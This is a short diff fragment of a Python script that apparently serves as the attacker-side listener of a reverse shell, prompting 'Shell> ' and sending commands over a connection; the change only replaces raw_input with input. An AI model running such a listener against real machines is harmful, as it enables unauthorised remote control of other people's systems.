@@ -10,7 +10,7 @@ def connect():
     print('[+] We got a connection from: ', addr)
 
 while True:
-    command = raw_input('Shell> ')
+    command = input('Shell> ')
     if 'terminate' in command:
         conn.send('terminate')
         conn.close()
